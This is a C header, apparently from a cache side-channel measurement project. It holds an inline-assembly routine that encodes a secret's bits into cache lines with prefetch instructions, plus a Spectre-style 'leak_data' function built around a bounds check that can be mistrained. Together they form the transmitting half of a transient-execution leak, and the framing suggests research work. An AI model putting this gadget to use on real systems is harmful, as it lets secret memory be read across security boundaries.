#include <stdint.h>
#include <stdio.h>

#include "../include/constants.h"
#include "../include/instructions.h"


#ifndef CBSC_MEASUREMENT_SPECTRE_H
#define CBSC_MEASUREMENT_SPECTRE_H

static inline __always_inline void asm_encode_data(uint64_t data, uint8_t *channel)
{
    __asm__ volatile("xor %%rax, %%rax\n"

                     "movb $0x0, %%bl\n"
                     "movq $0x1, %%rcx\n"
                     "enc:\n"

                     "addb $0x1, %%bl\n"
                     "addq %[linesize],%[channel]\n"
                     "movq %[data], %%rax\n"
                     "andq %%rcx, %%rax\n"
                     "testq %%rax, %%rax\n"
                     "jz nenc\n"
                     "prefetcht0 (%[channel])\n"

                     "nenc:\n"
                     "sal $0x1, %%rcx\n"
                     "cmpb %[bitscount], %%bl\n"
                     "jne enc\n"
                     :
                     : [data] "r"(data), [channel] "r"(channel), [linesize] "i"(CACHE_LINE_SIZE), [bitscount] "i"(NUMBER_TRANSFER_BITS)
                     : "rax", "rbx", "rcx", "cc"
    );
}


// returns if false during the training phase
bool leak_data(uint32_t iteration, uint32_t *train_data, uint32_t train_data_len, uint64_t secret, uint8_t channel[])
{
    if (train_data[iteration] < train_data_len)
    {
        asm_encode_data(secret, channel);
        return true;
    }
    return false;
}

#endif